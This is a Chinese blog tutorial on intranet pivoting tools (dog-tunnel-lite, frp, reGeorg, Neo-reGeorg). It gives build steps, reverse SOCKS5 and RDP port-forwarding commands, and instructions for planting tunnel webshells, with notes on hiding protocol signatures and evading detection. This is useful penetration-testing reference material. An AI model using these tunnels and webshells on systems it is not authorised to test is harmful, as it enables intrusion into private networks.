class="line">│   └── pipe_test.go</span><br><span class="line">├── platform</span><br><span class="line">│   ├── platform_darwin.go</span><br><span class="line">│   ├── platform_unix.go</span><br><span class="line">│   └── platform_win.go</span><br><span class="line">├── README.md</span><br><span class="line">└── release.sh</span><br><span class="line"></span><br><span class="line">4 directories, 19 files</span><br></pre></td></tr></table></figure>
+
+<p>此时的<code>dtunnel_lite</code>即为编译好的x64版本<code>dog-tunnel-lite</code>版。</p>
+<p>本地编译时候内存溢出。。。。。。放弃了</p>
+<h4 id="Windows编译-x64"><a href="#Windows编译-x64" class="headerlink" title="Windows编译  x64"></a>Windows编译  x64</h4><blockquote>
+<p>我这里时Windows7_x64 。</p>
+</blockquote>
+<ul>
+<li>Windows编译前置条件</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、go (添加环境变量)</span><br><span class="line"><span class="meta">#</span><span class="bash"> https://studygolang.com/dl  </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> https://studygolang.com/dl/golang/go1.13.1.windows-amd64.msi</span></span><br><span class="line"></span><br><span class="line">2、mingw64(GCC编译器，添加环境变量)</span><br><span class="line"><span class="meta">#</span><span class="bash"> https://sourceforge.net/projects/mingw-w64/files/Toolchains%20targetting%20Win64/Personal%20Builds/mingw-builds/8.1.0/threads-posix/seh/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> https://nchc.dl.sourceforge.net/project/mingw-w64/Toolchains targetting Win64/Personal Builds/mingw-builds/8.1.0/threads-posix/seh/x86_64-8.1.0-release-posix-seh-rt_v6-rev0.7z</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>打开CMD(任意目录)，执行以下命令：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/klauspost/reedsolomon</span><br><span class="line">go get github.com/cznic/zappy</span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装依赖，我这里不是以管理员命令执行的。因此安装以后文件在：C:\Users\aa\go\src\github.com\</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>然后下载dog-tunnel-lite进行编译(注意自己的路径)：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">go get -u -d github.com/vzex/dog-tunnel # 下载dog-tunnel</span><br><span class="line">cd C:\Users\aa\go\src\github.com\vzex\dog-tunnel  # 切换到文件下载目录</span><br><span class="line">git checkout udpVersion  # 选择dog-tunnel-lite版本(也即是udpVersion)</span><br><span class="line">go build client.go</span><br></pre></td></tr></table></figure>
+
+<p>然后发现<code>C:\Users\aa\go\src\github.com\vzex\dog-tunnel</code>出现了client.exe即dog-tunnel-lite_x64。</p>
+<h4 id="windows编译-x86"><a href="#windows编译-x86" class="headerlink" title="windows编译 x86"></a>windows编译 x86</h4><ul>
+<li><p>首先将之前生成的client.exe移动到其他目录或者删除。(紧接着x64的，注意目录)</p>
+</li>
+<li><p>使用<code>go env</code>命令,查看系统的配置环境,可以看到GOARCH(当前系统)是amd64</p>
+</li>
+<li><p>执行 <code>set GOARCH=386</code> 配置go输出系统平台为32位,然后查看是否成功。(一下操作在当前窗口进行操作)</p>
+</li>
+<li><p>go build client.go，即可，查看属性-&gt;兼容性-&gt;设置，其中为可选即为32位，winhex在文件头中能找到<br>&gt;&gt;&gt;PE..d 的是64位<br>&gt;&gt;&gt;PE..L 的是32位</p>
+</li>
+<li><p>然后还原go,执行<code>set GOARCH=amd64</code></p>
+</li>
+</ul>
+<h4 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h4><blockquote>
+<p>我个人主要是使用端口转发以及Socks5代理。</p>
+</blockquote>
+<p>其他细节请参考<code>https://github.com/vzex/dog-tunnel/blob/lite_v1.41/HowToUse.txt</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">参数说明  v1.20</span><br><span class="line">    所有参数前面加了c/s字样，用于描述参数的可使用范围</span><br><span class="line">    c表示只能客户端使用，s只能服务端</span><br><span class="line">    cs代表两端必须一致 c|s代表两端都可以用，可不保证一致，具体用法参考--help</span><br><span class="line">-action 指明通道行为，默认socks5（socks5代理服务）,可设置ip:port，作为端口转发用，客户端可指定该参数，当服务端指定参数时会强制采用服务端策略, 指定参数route将开启透明代理模式，windows版本不支持该模式，该模式下请自行设置用户的DNS和网关，将需要的tcp连接通过iptables转发到-local端口即可</span><br><span class="line">-auth 用于简单的登录验证，两端不一致时客户端会被断开</span><br><span class="line">-debug 调试输出,需要和-v一起使用</span><br><span class="line">-dnscache (有加速效果)当socks5(socks5_smart)模式时有效，指定dns缓存时间，默认0，单位分钟,socks5_smart模式下近端也可指定该参数,因为会有请求通过近端解析</span><br><span class="line">-encrypt 客户端指定，表示该通道是否启用消息加密</span><br><span class="line">-local 通道连通时本地监听端口，格式ip:port</span><br><span class="line">-pipe (有加速效果)通道个数，默认1</span><br><span class="line">-r 反向模式，true时客户端触发action行为，服务端监听local指定的端口</span><br><span class="line">-service 通道服务端地址，客户端指定时为连接地址，服务端指定时为监听地址，用于通道打通，双方地址一致，一般为服务端ip:port</span><br><span class="line">-tcp tcp模式，默认false，使用udp模式在网络差的环境下效率更高，cpu占用也更高(待优化),两端需一致</span><br><span class="line">-timeout 客户端执行连接超时时间，tcp模式关闭模式时有效</span><br><span class="line">-v 更多输出信息</span><br><span class="line">-version 版本信息</span><br><span class="line">-src 记录来源ip和访问目的ip</span><br><span class="line"></span><br><span class="line">-xor 两端须一致，用于udp模式握手加密,内容为任意字符串(主要用于隐藏通讯协议特征，建议设置)</span><br><span class="line">-session_timeout 指定连接会话在不活跃状态时多久（秒）后被销毁，防止被动连接的情况下产生僵尸socket，默认0不自动销毁</span><br><span class="line">-kcp 可设置kcp协议相关参数，高级用户使用，格式参考-kcp nodelay:1;snd=100; </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Socks5代理(主要内网测试中经常用)</li>
+</ul>
+<p>服务端(s,也即是公网主机运行命令)，这里为Linux：</p>
+<blockquote>
+<p>监听1.2.3.4:1234端口。指定加密字符传-xor ddd ,指定验证字符ccc,服务端强制启用 socks5代理</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dtunnel_lite -service 1.2.3.4:1234 -xor ddd -v -auth ccc -action socks5</span><br></pre></td></tr></table></figure>
+
+<p>客户端(内网主机)这里为windows:</p>
+<blockquote>
+<p>连接到服务端1.2.3.4:1234，指定socks5代理，通道连通时候监听端口,这里使用了-r(也即是反向代理，表示服务器开放8899端口作为socks5代理。)</p>
+</blockquote>
+<p>这里是只要使用socks5代理即可连通内网：<code>socks5 : 1.2.3.4:8899</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\client.exe  -service 1.2.3.4:1234 -v -action socks5  -xor ddd -local :8899 -pipe 5 -session_timeout 30 -auth ccc -r</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>端口转发(经常用在不出网的数据库等。。)</li>
+</ul>
+<p>服务端：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;dtunnel_lite -service 1.2.3.4.106:1234 -xor ddd -v -auth ccc</span><br></pre></td></tr></table></figure>
+
+<p>客户端：</p>
+<blockquote>
+<p>利用反向代理，将内网主机的80端口映射到公网主机的9999端口</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\client.exe  -service 1.2.3.4:1234  -v -action 127.0.0.1:3389 -encrypt -xor ddd -local :9999 -pipe 5 -r -auth ccc -encrypt</span><br></pre></td></tr></table></figure>
+
+<h3 id="Fpr"><a href="#Fpr" class="headerlink" title="Fpr"></a>Fpr</h3><p>只介绍常用的。</p>
+<h4 id="本地编译"><a href="#本地编译" class="headerlink" title="本地编译"></a>本地编译</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先需要Go环境</span></span><br><span class="line"><span class="comment"># git clone https://github.com/fatedier/frp.git</span></span><br><span class="line">go get github.com/fatedier/frp</span><br><span class="line">make -f Makefile.cross-compiles </span><br><span class="line"><span class="comment"># 编译好的文件在 frp根目录下</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="官方成品"><a href="#官方成品" class="headerlink" title="官方成品"></a>官方成品</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fatedier/frp/releases</span><br><span class="line"><span class="comment"># 官方编译好的，直接可用</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="使用方式-1"><a href="#使用方式-1" class="headerlink" title="使用方式"></a>使用方式</h4><p><strong>服务端：</strong></p>
+<blockquote>
+<p>./frps -c frps.ini</p>
+</blockquote>
+<p><strong>服务端通用写法：</strong></p>
+<p>一般不做dashboard用法，在内网代理/转发时候。</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># [common] is integral section</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="comment"># A literal address or host name for IPv6 must be enclosed</span></span><br><span class="line"><span class="comment"># in square brackets, as in &quot;[::1]:80&quot;, &quot;[ipv6-host]:http&quot; or &quot;[ipv6-host%zone]:80&quot;</span></span><br><span class="line"><span class="comment"># 服务端默认监听的地址及端口</span></span><br><span class="line"><span class="attr">bind_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># udp port to help make udp hole to penetrate nat</span></span><br><span class="line"><span class="attr">bind_udp_port</span> = <span class="number">7001</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># udp port used for kcp protocol, it can be same with &#x27;bind_port&#x27;</span></span><br><span class="line"><span class="comment"># if not set, kcp is disabled in frps</span></span><br><span class="line"><span class="comment"># 作用和bind_port一样</span></span><br><span class="line"><span class="attr">kcp_bind_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># auth token</span></span><br><span class="line"><span class="attr">token</span> = <span class="number">12345678</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 可视化界面(frp Web界面)</span></span><br><span class="line"><span class="comment"># set dashboard_addr and dashboard_port to view dashboard of frps</span></span><br><span class="line"><span class="comment"># dashboard_addr&#x27;s default value is same with bind_addr</span></span><br><span class="line"><span class="comment"># dashboard is available only if dashboard_port is set</span></span><br><span class="line"><span class="attr">dashboard_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">7500</span></span><br><span class="line"><span class="comment"># dashboard user and passwd for basic auth protect, if not set, both default value is admin</span></span><br><span class="line"><span class="attr">dashboard_user</span> = admin</span><br><span class="line"><span class="attr">dashboard_pwd</span> = admin</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>./frpc -c frpc.ini</p>
+</blockquote>
+<p><strong>客户端通用写法：</strong></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">90.231</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="comment"># for authentication</span></span><br><span class="line"><span class="attr">token</span> = <span class="number">12345678</span></span><br><span class="line"><span class="comment"># set admin address for control frpc&#x27;s action by http api such as reload</span></span><br><span class="line"><span class="attr">admin_addr</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">admin_port</span> = <span class="number">7400</span></span><br><span class="line"><span class="attr">admin_user</span> = admin</span><br><span class="line"><span class="attr">admin_pwd</span> = admin</span><br><span class="line"></span><br><span class="line"><span class="section">[ssh_random]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="comment"># if remote_port is 0, frps will assign a random port for you</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="SSH转发"><a href="#SSH转发" class="headerlink" title="SSH转发"></a>SSH转发</h4><ul>
+<li>第一种方式：将目标机的SSH端口转发到指定/随机端口</li>
+</ul>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">90.231</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ssh_random]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="comment"># if remote_port is 0, frps will assign a random port for you</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>第二种：设置各种参数(传输加密、数据压缩、超时时间等)</li>
+</ul>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">90.231</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="comment"># tcp | udp | http | https | stcp | xtcp, default is tcp(可用的协议)</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="comment"># limit bandwith for this proxy, unit is KB and MB(设置此代理的带宽)</span></span><br><span class="line"><span class="attr">bandwith_limit</span> = <span class="number">1</span>MB</span><br><span class="line"><span class="comment"># true or false, if true, messages between frps and frpc will be encrypted, default is false(设置传输加密，默认不加密)</span></span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">false</span></span><br><span class="line"><span class="comment"># if true, message will be compressed(传输数据压缩)</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">false</span></span><br><span class="line"><span class="comment"># remote port listen by frps(转发到的端口，即client ssh:22----&gt; Server:6001)</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6001</span></span><br><span class="line"><span class="comment"># frps will load balancing connections for proxies in same group</span></span><br><span class="line"><span class="attr">group</span> = test_group</span><br><span class="line"><span class="comment"># group should have same group key</span></span><br><span class="line"><span class="attr">group_key</span> = <span class="number">123456</span></span><br><span class="line"><span class="comment"># enable health check for the backend service, it support &#x27;tcp&#x27; and &#x27;http&#x27; now</span></span><br><span class="line"><span class="comment"># frpc will connect local service&#x27;s port to detect it&#x27;s healthy status</span></span><br><span class="line"><span class="attr">health_check_type</span> = tcp</span><br><span class="line"><span class="comment"># health check connection timeout(超时时间)</span></span><br><span class="line"><span class="attr">health_check_timeout_s</span> = <span class="number">3</span></span><br><span class="line"><span class="comment"># if continuous failed in 3 times, the proxy will be removed from frps(最大错误次数，超过则删除代理)</span></span><br><span class="line"><span class="attr">health_check_max_failed</span> = <span class="number">3</span></span><br><span class="line"><span class="comment"># every 10 seconds will do a health check(检测代理的时间间隔)</span></span><br><span class="line"><span class="attr">health_check_interval_s</span> = <span class="number">10</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="HTTP-Socks5代理"><a href="#HTTP-Socks5代理" class="headerlink" title="HTTP/Socks5代理"></a>HTTP/Socks5代理</h4><p>将需要通过这个代理访问外网的内部机器的代理地址设置为192.168.90.231:6000，这样就可以通过 FRP 客户端机器的网络访问互联网了。<br> http_proxy 插件也支持认证机制，如果需要启用认证可通过配置参数 plugin_http_user 和 plugin_http_passwd 启用。<br> 如需启用 Socks5 代理，只需将 plugin 的值更换为 socks5 即可。</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">90.231</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[http_proxy]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span></span><br><span class="line"><span class="attr">plugin</span> = http_proxy</span><br><span class="line"><span class="comment"># 设置账号密码</span></span><br><span class="line"><span class="comment"># plugin_http_user = abc</span></span><br><span class="line"><span class="comment"># plugin_http_passwd = abc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># plugin = socks5</span></span><br><span class="line"><span class="comment"># plugin_user = abc</span></span><br><span class="line"><span class="comment"># plugin_passwd = abc</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="TCP-UDP端口转发"><a href="#TCP-UDP端口转发" class="headerlink" title="TCP/UDP端口转发"></a>TCP/UDP端口转发</h4><ul>
+<li>TCP协议进行端口转发，多端口需要，local_port和remote_port个数进行对应。</li>
+</ul>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">90.231</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[range:tcp_port]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">80</span>,<span class="number">88</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8000</span>,<span class="number">8888</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>UDP</li>
+</ul>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">192.168</span>.<span class="number">90.231</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[range:udp_port]</span></span><br><span class="line"><span class="attr">type</span> = udp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">6010</span>-<span class="number">6020</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6010</span>-<span class="number">6020</span></span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">false</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="reGeorg"><a href="#reGeorg" class="headerlink" title="reGeorg"></a>reGeorg</h3><p>reGeorg 是 reDuh 的升级版，主要是把内网服务器的端口通过 http/https  隧道转发到本机，形成一个回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。它利用 webshell 建立一个  socks 代理进行内网穿透，服务器必须支持 aspx、php 或 jsp 这些 web 程序中的一种。</p>
+<ul>
+<li>首先上传tunnel.jsp到Web服务器,浏览器访问一下，确认正常解析。然后本地运行。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http://We地址/tunnel.jsp -p <span class="number">9999</span>	</span><br></pre></td></tr></table></figure>
+
+<p>配置proxyChains或者其他代理工具。</p>
+<h3 id="Neo-reGeorg"><a href="#Neo-reGeorg" class="headerlink" title="Neo-reGeorg"></a>Neo-reGeorg</h3><ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0wtY29kZXMvTmVvLXJlR2Vvcmc=">https://github.com/L-codes/Neo-reGeorg<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><strong>Neo-reGeorg</strong> 是一个旨在积极重构 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3Jn">reGeorg<i class="fa fa-external-link-alt"></i></span> 的项目，目的是：</p>
+<ul>
+<li>提高 tunnel 连接安全性</li>
+<li>提高可用性，避免特征检测</li>
+<li>提高传输内容保密性</li>
+<li>解决 reGeorg 现存在的问题，修复部分小BUG</li>
+</ul>
+<p><strong>查看帮助信息：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> π Neo-reGeorg master ❯ python3 neoreg.py generate -h</span><br><span class="line">usage: neoreg.py [-h] -k KEY [-o DIR] [-f FILE] [--read-buff Bytes]</span><br><span class="line"></span><br><span class="line">Generate neoreg webshell</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -k KEY, --key KEY     Specify connection key.</span><br><span class="line">  -o DIR, --outdir DIR  Output directory.</span><br><span class="line">  -f FILE, --file FILE  Camouflage html page file</span><br><span class="line">  --read-buff Bytes     Remote <span class="built_in">read</span> buffer.(default: 513)</span><br><span class="line">  </span><br><span class="line"> π Neo-reGeorg master ❯ python3 neoreg.py  -h</span><br><span class="line">usage: neoreg.py [-h] -u URI -k KEY [-l IP] [-p PORT] [-s] [-H LINE] [-c LINE]</span><br><span class="line">                 [-x LINE] [--read-buff Bytes] [--read-interval MS]</span><br><span class="line">                 [--max-threads N] [-v]</span><br><span class="line"></span><br><span class="line">Socks server <span class="keyword">for</span> Neoreg HTTP(s) tunneller. DEBUG MODE: -k</span><br><span class="line">(debug_all|debug_base64|debug_headers_key|debug_headers_values)</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -u URI, --url URI     The url containing the tunnel script</span><br><span class="line">  -k KEY, --key KEY     Specify connection key</span><br><span class="line">  -l IP, --listen-on IP</span><br><span class="line">                        The default listening address.(default: 127.0.0.1)</span><br><span class="line">  -p PORT, --listen-port PORT</span><br><span class="line">                        The default listening port.(default: 1080)</span><br><span class="line">  -s, --skip            Skip usability testing</span><br><span class="line">  -H LINE, --header LINE</span><br><span class="line">                        Pass custom header LINE to server</span><br><span class="line">  -c LINE, --cookie LINE</span><br><span class="line">                        Custom init cookies</span><br><span class="line">  -x LINE, --proxy LINE</span><br><span class="line">                        proto://host[:port] Use proxy on given port</span><br><span class="line">  --read-buff Bytes     Local <span class="built_in">read</span> buffer, max data to be sent per</span><br><span class="line">                        POST.(default: 2048 max: 2600)</span><br><span class="line">  --read-interval MS    Read data interval <span class="keyword">in</span> milliseconds.(default: 100)</span><br><span class="line">  --max-threads N       Proxy max threads.(default: 1000)</span><br><span class="line">  -v                    Increase verbosity level (use -vv or more <span class="keyword">for</span> greater</span><br><span class="line">                        effect)</span><br></pre></td></tr></table></figure>
+
+<p>#####普通用法 </p>
+<p>服务端：首先需要设置密码生成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python neoreg.py generate -k password</span><br><span class="line"></span><br><span class="line">    [+] Create neoreg server files:</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.nosocket.php</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.js</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.php</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.ashx</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.aspx</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.tomcat.5.jsp</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.tomcat.5.jspx</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.jsp</span><br><span class="line">       &#x3D;&gt; neoreg_server&#x2F;tunnel.jspx</span><br></pre></td></tr></table></figure>
+
+<p>客户端：</p>
